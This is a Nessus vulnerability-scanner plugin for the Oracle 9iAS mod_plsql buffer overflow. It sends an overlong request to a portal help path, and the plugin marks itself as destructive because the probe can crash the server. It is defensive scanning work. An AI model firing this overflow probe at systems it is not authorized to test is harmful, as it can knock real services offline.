#
# This script was written by Matt Moore <matt@westpoint.ltd.uk>
#

if(description)
{
 script_id(10840);
 script_version("$Revision: 1.14 $");
 script_bugtraq_id(3726);
 script_cve_id("CAN-2001-1216");
 name["english"] = "Oracle 9iAS mod_plsql Buffer Overflow";
 name["francais"] = "Oracle 9iAS mod_plsql Buffer Overflow";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "

Oracle 9i Application Server uses Apache as it's web
server. There is a buffer overflow in the mod_plsql module
which allows an attacker to run arbitrary code.

Solution: 

Oracle have released a patch for this vulnerability, which
is available from:

http://metalink.oracle.com

References:

http://www.nextgenss.com/advisories/plsql.txt
http://otn.oracle.com/deploy/security/pdf/modplsql.pdf

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Oracle 9iAS mod_plsql Overflow";
 summary["francais"] = "Oracle 9iAS mod_plsql Overflow";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/OracleApache");
 exit(0);
}

#
# The script code starts here
# 

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
# Send 215 chars at the end of the URL
  buf = http_get(item:string("/pls/portal30/admin_/help/", crap(215)), port:port);
  send(socket:soc, data:buf);
 
 unbreakable = http_recv(socket:soc);
 if(!unbreakable)
	security_hole(port);
  
  } else {
   http_close_socket(soc);
  }
 }

